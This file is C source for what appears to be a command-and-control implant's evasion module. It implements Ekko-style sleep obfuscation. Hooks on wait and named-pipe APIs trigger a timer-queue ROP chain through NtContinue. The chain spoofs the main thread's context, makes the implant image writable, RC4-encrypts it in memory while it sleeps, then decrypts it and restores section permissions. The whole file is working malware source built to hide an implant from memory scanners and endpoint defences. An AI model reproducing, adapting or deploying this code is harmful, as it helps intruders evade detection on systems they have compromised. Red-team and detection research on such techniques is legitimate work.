#include "hooks.h"

static const DWORD g_ProtectionMap[8] = {
    PAGE_NOACCESS,          // 000: None
    PAGE_EXECUTE,           // 001: E
    PAGE_READONLY,          // 010: R
    PAGE_EXECUTE_READ,      // 011: R E
    PAGE_READWRITE,         // 100: W (mapped to RW)
    PAGE_EXECUTE_READWRITE, // 101: W E (mapped to RWX)
    PAGE_READWRITE,         // 110: R W
    PAGE_EXECUTE_READWRITE  // 111: R W E
};

static void restore_section_permissions(void)
{
    if (!g_ImageBase) return;

    unsigned char *base = (unsigned char *)g_ImageBase;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)PTR_OFFSET(
        &nt->OptionalHeader, 
        nt->FileHeader.SizeOfOptionalHeader
    );

    DWORD old_prot = 0;

    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        void *addr = base + sec->VirtualAddress;
        DWORD size = (sec->Misc.VirtualSize > 0) ? sec->Misc.VirtualSize : sec->SizeOfRawData;

        if (size == 0) continue;

        unsigned int index = 0;
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) index |= 1;
        if (sec->Characteristics & IMAGE_SCN_MEM_READ)    index |= 2;
        if (sec->Characteristics & IMAGE_SCN_MEM_WRITE)   index |= 4;

        DWORD prot = g_ProtectionMap[index];

        KERNEL32$VirtualProtect(addr, size, prot, &old_prot);
    }

    KERNEL32$VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old_prot);
    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, base, g_ImageSize);
}


ULONG RndThreadId(ULONG CurrentThreadId) { 
    PVOID pBuffer = NULL;
    PSYSTEM_PROCESS_INFORMATION pCurrentProc = NULL;
    ULONG RandomThreadId = 0;
    ULONG ReturnLength = 0;
    ULONG TargetPid = (ULONG)KERNEL32$GetCurrentProcessId();

    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength);
    if (status != STATUS_INFO_LENGTH_MISMATCH) return CurrentThreadId;

    pBuffer = KERNEL32$VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuffer) return CurrentThreadId;

    status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, pBuffer, ReturnLength, &ReturnLength);
    if (status != 0) {
        KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);
        return CurrentThreadId;
    }

    pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)pBuffer;

    while (TRUE) {
        if ((ULONG_PTR)pCurrentProc->UniqueProcessId == (ULONG_PTR)TargetPid) {
            for (ULONG i = 0; i < pCurrentProc->NumberOfThreads; i++) {
                PSYSTEM_THREAD_INFORMATION pThread = &pCurrentProc->Threads[i];
                ULONG Tid = (ULONG)(ULONG_PTR)pThread->ClientId.UniqueThread;

                if (Tid != CurrentThreadId) {
                    RandomThreadId = Tid;
                    break;
                }
            }
            break; 
        }

        if (pCurrentProc->NextEntryOffset == 0) break;
        
        pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCurrentProc + pCurrentProc->NextEntryOffset);
    }
    KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);
    return (RandomThreadId != 0) ? RandomThreadId : CurrentThreadId;
}


VOID HandleUnexpectedError(HOOK_TYPE Hook, HOOK_ARGS *Args) {
    switch(Hook) {
        case WAIT_FOR_SINGLE_OBJECT_EX:
            Args->WaitForSingleObjectExArgs.OriginalFunc(Args->WaitForSingleObjectExArgs.hObject, Args->WaitForSingleObjectExArgs.dwMilliseconds, Args->WaitForSingleObjectExArgs.bAlertable);
            break;
        case WAIT_FOR_MULTIPLE_OBJECTS:
            Args->WaitForMultipleObjectsArgs.OriginalFunc(Args->WaitForMultipleObjectsArgs.nCount, Args->WaitForMultipleObjectsArgs.lpHandles, Args->WaitForMultipleObjectsArgs.bWaitAll, Args->WaitForMultipleObjectsArgs.dwMilliseconds);
            break;
        case CONNECT_NAMED_PIPE:
            Args->ConnectNamedPipeArgs.OriginalFunc(Args->ConnectNamedPipeArgs.hPipe, Args->ConnectNamedPipeArgs.lpOverlapped);
            break;
    }
}

VOID DetourWaitForMultipleObjects(WAIT_FOR_MULTIPLE_OBJECTS_ARGS *Args) {
    DWORD returnValue = Args->OriginalFunc(Args->nCount, Args->lpHandles, Args->bWaitAll, Args->dwMilliseconds);
    Args->returnValue = returnValue; // Store the return value for use in the ROP chain
}

/**
 * Resolve all original function pointers once so hooked functions and
 * EkkoObf do not call GetProcAddress on every invocation.
 * Called from set_image_info() after the DLL image is mapped.
 */
VOID ResolveHookFunctions(VOID)
{

    HMODULE hKernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll    = KERNEL32$GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi   = KERNEL32$LoadLibraryA("advapi32.dll");

    g_pWaitForSingleObjectEx  = (fnWaitForSingleObjectEx) KERNEL32$GetProcAddress(hKernel32, "WaitForSingleObjectEx");
    g_pWaitForMultipleObjects = (fnWaitForMultipleObjects)KERNEL32$GetProcAddress(hKernel32, "WaitForMultipleObjects");
    g_pConnectNamedPipe       = (fnConnectNamedPipe)     KERNEL32$GetProcAddress(hKernel32, "ConnectNamedPipe");
    g_pNtContinue             = (fnNtContinue)            KERNEL32$GetProcAddress(hNtdll,    "NtContinue");
    g_pRtlCaptureContext      = (fnRtlCaptureContext)     KERNEL32$GetProcAddress(hNtdll,    "RtlCaptureContext");
    g_pSysFunc032             = (fnSystemFunction032)     KERNEL32$GetProcAddress(hAdvapi,   "SystemFunction032");

    StealthDbg("ResolveHookFunctions: WaitSingleObjEx=%p WaitMultiObjs=%p ConnectNamedPipe=%p\n",
        g_pWaitForSingleObjectEx, g_pWaitForMultipleObjects, g_pConnectNamedPipe);
    StealthDbg("ResolveHookFunctions: NtContinue=%p RtlCaptureCtx=%p SysFunc032=%p\n",
        g_pNtContinue, g_pRtlCaptureContext, g_pSysFunc032);

}

VOID EkkoObf(HOOK_TYPE Hook, HOOK_ARGS *Args)
{
    ULONG  CurrentThreadId = KERNEL32$GetCurrentThreadId();
    ULONG  RandomThreadId  = RndThreadId(CurrentThreadId);

    StealthDbg("CurrentThreadId=%lu RandomThreadId=%lu\n", CurrentThreadId, RandomThreadId);

    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;

    /* 11 contexts: captured + 10 ROP frames */
    CONTEXT CtxThread;
    CONTEXT RopWait;
    CONTEXT RopGetCtx;
    CONTEXT RopSetSpf;
    CONTEXT RopProtRW;
    CONTEXT RopMemEnc;
    CONTEXT RopDelay;
    CONTEXT RopMemDec;
    CONTEXT RopProtRX;
    CONTEXT RopRstCtx;
    CONTEXT RopSetEvt;

    CONTEXT CtxSpf;
    CONTEXT CtxBkp;

    MSVCRT$memset(&CtxThread, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopWait,   0, sizeof(CONTEXT));
    MSVCRT$memset(&RopGetCtx, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopSetSpf, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopProtRW, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopMemEnc, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopDelay,  0, sizeof(CONTEXT));
    MSVCRT$memset(&RopMemDec, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopProtRX, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopRstCtx, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopSetEvt, 0, sizeof(CONTEXT));

    MSVCRT$memset(&CtxSpf, 0, sizeof(CONTEXT));
    MSVCRT$memset(&CtxBkp, 0, sizeof(CONTEXT));

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvtCapture = NULL;   /* manual-reset: context capture sync    */
    HANDLE  hEvtStart   = NULL;   /* manual-reset: gate for ROP chain      */
    HANDLE  hEvtEnd     = NULL;   /* manual-reset: completion signal       */
    DWORD   OldProtect  = 0;
    DWORD   DelayTimer  = 0;

    /* RC4 key */
    CHAR    KeyBuf[16];
    MSVCRT$memset(KeyBuf, 0x55, 16);
    USTRING Key;
    USTRING Img ;

    MSVCRT$memset(&Key, 0, sizeof(USTRING));
    MSVCRT$memset(&Img, 0, sizeof(USTRING));

    if (!g_ImageBase || !g_ImageSize) {
        StealthDbg("ERROR: ImageBase or ImageSize not set, cannot proceed with obfuscation\n");
        HandleUnexpectedError(Hook, Args);
        return;
    }

    if (!g_pNtContinue || !g_pRtlCaptureContext || !g_pSysFunc032) {
        StealthDbg("ERROR: required functions not resolved, cannot proceed with obfuscation\n");
        HandleUnexpectedError(Hook, Args);
        return;
    }

    // StealthDbg("ImageBase=%p Size=0x%lx SleepTime=%lu ms\n", g_ImageBase, g_ImageSize, SleepTime);
    StealthDbg("current tid=%lu  spoof tid=%lu\n", CurrentThreadId, RandomThreadId);

    /* ── setup USTRING for SystemFunction032 ── */
    Key.Buffer = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;
    Img.Buffer = g_ImageBase;
    Img.Length  = Img.MaximumLength = g_ImageSize;

    /* ── open the random thread for context spoofing ── */
    DupThreadHandle = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, RandomThreadId);
    if (!DupThreadHandle) {
        StealthDbg("WARN: OpenThread(%lu) failed, skipping thread spoof\n", RandomThreadId);
    } else {
        StealthDbg("DupThreadHandle=%p (tid %lu)\n", DupThreadHandle, RandomThreadId);
    }

    /* ── duplicate current thread handle ── */
    KERNEL32$DuplicateHandle(
        NtCurrentProcess(),
        NtCurrentThread(),
        NtCurrentProcess(),
        &MainThreadHandle,
        THREAD_ALL_ACCESS,
        FALSE,
        0
    );

    if (!MainThreadHandle) {
        StealthDbg("ERROR: DuplicateHandle for main thread failed, cannot proceed with obfuscation\n");
        HandleUnexpectedError(Hook, Args);
        return;
    }

    StealthDbg("MainThreadHandle=%p\n", MainThreadHandle);

    /* ── create 3 manual-reset events (like Kharon EventTimer/EventStart/EventEnd) ── */
    hEvtCapture = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    hEvtStart   = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    hEvtEnd     = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    hTimerQueue = KERNEL32$CreateTimerQueue();

    if (!hEvtCapture || !hEvtStart || !hEvtEnd || !hTimerQueue) {
        StealthDbg("ERROR: failed to create events/timer queue\n");
        if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
        if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
        if (hEvtCapture) KERNEL32$CloseHandle(hEvtCapture);
        if (hEvtStart)   KERNEL32$CloseHandle(hEvtStart);
        if (hEvtEnd)     KERNEL32$CloseHandle(hEvtEnd);
        if (hTimerQueue) KERNEL32$DeleteTimerQueue(hTimerQueue);

        StealthDbg("falling back to original function\n");
        HandleUnexpectedError(Hook, Args);
        return;
    }
    StealthDbg("events and timer queue created\n");

    /* ── capture spoof thread context ── */
    CtxSpf.ContextFlags = CONTEXT_ALL;
    CtxBkp.ContextFlags = CONTEXT_ALL;

    if (DupThreadHandle) {
        BOOL ok = KERNEL32$GetThreadContext(DupThreadHandle, &CtxSpf);
        StealthDbg("GetThreadContext(spoof) = %d  Rip=%p Rsp=%p\n", ok, (PVOID)CtxSpf.Rip, (PVOID)CtxSpf.Rsp);
    }

    /* ── step 0: capture timer-thread context via two timed callbacks ── */
    /*    Timer A: RtlCaptureContext(&CtxThread)                         */
    /*    Timer B: SetEvent(hEvtCapture) — signals capture is complete   */
    KERNEL32$CreateTimerQueueTimer(
        &hNewTimer,
        hTimerQueue,
        (WAITORTIMERCALLBACK)g_pRtlCaptureContext,
        &CtxThread,
        DelayTimer += 100,
        0,
        WT_EXECUTEINTIMERTHREAD
    );
    
    KERNEL32$CreateTimerQueueTimer(
        &hNewTimer,
        hTimerQueue,
        (WAITORTIMERCALLBACK)KERNEL32$SetEvent,
        hEvtCapture,
        DelayTimer += 100,
        0,
        WT_EXECUTEINTIMERTHREAD
    );

    StealthDbg("waiting for timer-thread context capture...\n");
    KERNEL32$WaitForSingleObject(hEvtCapture, INFINITE);
    StealthDbg("timer-thread context captured: Rip=%p Rsp=%p\n", (PVOID)CtxThread.Rip, (PVOID)CtxThread.Rsp);

    /* ── clone captured context into every ROP frame ── */
    MSVCRT$memcpy(&RopWait,   &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopGetCtx, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopSetSpf, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopRstCtx, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

    /* adjust stack for each frame (simulate CALL push of return address) */
    RopWait.Rsp   -= 8;
    RopGetCtx.Rsp -= 8;
    RopSetSpf.Rsp -= 8;
    RopProtRW.Rsp -= 8;
    RopMemEnc.Rsp -= 8;
    RopDelay.Rsp  -= 8;
    RopMemDec.Rsp -= 8;
    RopProtRX.Rsp -= 8;
    RopRstCtx.Rsp -= 8;
    RopSetEvt.Rsp -= 8;

    /* ── ROP 0: WaitForSingleObject(hEvtStart, INFINITE) — gate ── */
    RopWait.Rip = (DWORD64)KERNEL32$WaitForSingleObject;
    RopWait.Rcx = (DWORD64)hEvtStart;
    RopWait.Rdx = (DWORD64)INFINITE;

    /* ── ROP 1: GetThreadContext(MainThread, &CtxBkp) — backup ── */
    RopGetCtx.Rip = (DWORD64)KERNEL32$GetThreadContext;
    RopGetCtx.Rcx = (DWORD64)MainThreadHandle;
    RopGetCtx.Rdx = (DWORD64)&CtxBkp;

    /* ── ROP 2: SetThreadContext(MainThread, &CtxSpf) — spoof ── */
    RopSetSpf.Rip = (DWORD64)KERNEL32$SetThreadContext;
    RopSetSpf.Rcx = (DWORD64)MainThreadHandle;
    RopSetSpf.Rdx = (DWORD64)&CtxSpf;

    /* ── ROP 3: VirtualProtect → PAGE_READWRITE ── */
    RopProtRW.Rip = (DWORD64)KERNEL32$VirtualProtect;
    RopProtRW.Rcx = (DWORD64)g_ImageBase;
    RopProtRW.Rdx = (DWORD64)g_ImageSize;
    RopProtRW.R8  = PAGE_READWRITE;
    RopProtRW.R9  = (DWORD64)&OldProtect;

    /* ── ROP 4: SystemFunction032 → encrypt ── */
    RopMemEnc.Rip = (DWORD64)g_pSysFunc032;
    RopMemEnc.Rcx = (DWORD64)&Img;
    RopMemEnc.Rdx = (DWORD64)&Key;

    switch (Hook) {
        case WAIT_FOR_SINGLE_OBJECT_EX:
             /* ── ROP 5: WaitForSingleObjectEx ── */
            RopDelay.Rip = (DWORD64)Args->WaitForSingleObjectExArgs.OriginalFunc;
            RopDelay.Rcx = (DWORD64)Args->WaitForSingleObjectExArgs.hObject;
            RopDelay.Rdx = (DWORD64)Args->WaitForSingleObjectExArgs.dwMilliseconds;
            RopDelay.R8  = (DWORD64)Args->WaitForSingleObjectExArgs.bAlertable;
            break;
        
        case WAIT_FOR_MULTIPLE_OBJECTS:
             /* ── ROP 5: WaitForMultipleObjects ── */
            RopDelay.Rip = (DWORD64)DetourWaitForMultipleObjects;
            RopDelay.Rcx = (DWORD64)&Args->WaitForMultipleObjectsArgs;
            break;

        case CONNECT_NAMED_PIPE:
             /* ── ROP 5: ConnectNamedPipe ── */
            RopDelay.Rip = (DWORD64)g_pConnectNamedPipe;
            RopDelay.Rcx = (DWORD64)Args->ConnectNamedPipeArgs.hPipe;
            RopDelay.Rdx = (DWORD64)Args->ConnectNamedPipeArgs.lpOverlapped;
            break;

        default:
            StealthDbg("sleep obfuscation: unknown hook type %d\n", Hook);
    }

    /* ── ROP 6: SystemFunction032 → decrypt ── */
    RopMemDec.Rip = (DWORD64)g_pSysFunc032;
    RopMemDec.Rcx = (DWORD64)&Img;
    RopMemDec.Rdx = (DWORD64)&Key;

    /* ── ROP 7: restore_section_permissions ── */
    RopProtRX.Rip = (DWORD64)restore_section_permissions;

    /* ── ROP 8: SetThreadContext(MainThread, &CtxBkp) — restore ── */
    RopRstCtx.Rip = (DWORD64)KERNEL32$SetThreadContext;
    RopRstCtx.Rcx = (DWORD64)MainThreadHandle;
    RopRstCtx.Rdx = (DWORD64)&CtxBkp;

    /* ── ROP 9: SetEvent(hEvtEnd) — signal done ── */
    RopSetEvt.Rip = (DWORD64)KERNEL32$SetEvent;
    RopSetEvt.Rcx = (DWORD64)hEvtEnd;

    StealthDbg("queuing ROP chain (10 steps)...\n");

    /* queue each context frame via NtContinue, staggered 100ms apart */
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopWait,   DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopGetCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopSetSpf, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopProtRW, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopMemEnc, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopDelay,  DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopMemDec, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopProtRX, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopRstCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopSetEvt, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);

    StealthDbg("all timers queued (total delay=%lu ms). triggering gate...\n", DelayTimer);

    /* ── trigger: signal the gate, then wait for completion ── */
    KERNEL32$SetEvent(hEvtStart);
    StealthDbg("gate signaled, waiting for ROP chain to complete...\n");
    KERNEL32$WaitForSingleObject(hEvtEnd, INFINITE);

    StealthDbg("sleep obfuscation complete\n");

    /* ── cleanup ── */
    if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
    if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
    KERNEL32$CloseHandle(hEvtCapture);
    KERNEL32$CloseHandle(hEvtStart);
    KERNEL32$CloseHandle(hEvtEnd);
    KERNEL32$DeleteTimerQueue(hTimerQueue);
    StealthDbg("cleanup done\n");
}

DWORD _WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable) {
    StealthDbg("WaitForSingleObjectEx called - simulating wait\n");
    
    if (g_pWaitForSingleObjectEx) {
        WAIT_FOR_SINGLE_OBJECT_EX_ARGS WaitArgs = { hHandle, dwMilliseconds, bAlertable, g_pWaitForSingleObjectEx };
        if (dwMilliseconds == 1000) {
            StealthDbg("Sleep time below threshold, skipping obfuscation\n");
            StealthDbg("  hHandle=%p dwMilliseconds=%lu bAlertable=%d\n", hHandle, dwMilliseconds, bAlertable);
            return g_pWaitForSingleObjectEx(hHandle, dwMilliseconds, bAlertable); 
        }
        else if ( dwMilliseconds < 1000 ){
            StealthDbg("Sleep time below threshold, skipping obfuscation\n");
            dwMilliseconds = 100; // cap to 100ms to avoid long waits during obfuscation
            StealthDbg("  hHandle=%p dwMilliseconds=%lu bAlertable=%d\n", hHandle, dwMilliseconds, bAlertable);
            return g_pWaitForSingleObjectEx(hHandle, dwMilliseconds, bAlertable); 
            
        } else {
            StealthDbg("Wait time above threshold, applying obfuscation\n");
            StealthDbg("  hHandle=%p dwMilliseconds=%lu bAlertable=%d\n", hHandle, dwMilliseconds, bAlertable);
            HOOK_ARGS Args = { .WaitForSingleObjectExArgs = WaitArgs };
            EkkoObf(WAIT_FOR_SINGLE_OBJECT_EX, &Args);
            return WAIT_OBJECT_0; // Simulate that the wait completed successfully
        }
    } else {
        StealthDbg("ERROR: original WaitForSingleObjectEx not found\n");
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return WAIT_FAILED;
    }
}

DWORD _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
    StealthDbg("WaitForSingleObject called - simulating wait\n");
    return _WaitForSingleObjectEx(hHandle, dwMilliseconds, FALSE);    
}


DWORD _WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds) {
    StealthDbg("WaitForMultipleObjects called - simulating wait\n");
    
    if (g_pWaitForMultipleObjects) {
        StealthDbg("  nCount=%lu bWaitAll=%d dwMilliseconds=%lu\n", nCount, bWaitAll, dwMilliseconds);
        WAIT_FOR_MULTIPLE_OBJECTS_ARGS WaitArgs = { nCount, lpHandles, bWaitAll, dwMilliseconds, g_pWaitForMultipleObjects };
        HOOK_ARGS Args = { .WaitForMultipleObjectsArgs = WaitArgs };
        if (dwMilliseconds <= 200) {
            StealthDbg("Sleep time below threshold, skipping obfuscation\n");
            return g_pWaitForMultipleObjects(nCount, lpHandles, bWaitAll, dwMilliseconds); 
        } else {
            StealthDbg("Wait time above threshold, applying obfuscation\n");
            EkkoObf(WAIT_FOR_MULTIPLE_OBJECTS, &Args);
            return Args.WaitForMultipleObjectsArgs.returnValue; // Return the value set by the ROP chain
        }
    } else {
        StealthDbg("ERROR: original WaitForMultipleObjects not found\n");
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return WAIT_FAILED;
    }
}

BOOL _ConnectNamedPipe(HANDLE hPipe, LPOVERLAPPED lpOverlapped) {
    StealthDbg("ConnectNamedPipe called - simulating connection\n");
    
    if (g_pConnectNamedPipe) {
        StealthDbg("  hPipe=%p lpOverlapped=%p\n", hPipe, lpOverlapped);
        CONNECT_NAMED_PIPE_ARGS ConnectArgs = { hPipe, lpOverlapped, g_pConnectNamedPipe };
        HOOK_ARGS Args = { .ConnectNamedPipeArgs = ConnectArgs };
        EkkoObf(CONNECT_NAMED_PIPE, &Args);
        return TRUE; // Simulate successful connection
    } else {
        StealthDbg("ERROR: original ConnectNamedPipe not found\n");
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return FALSE;
    }
}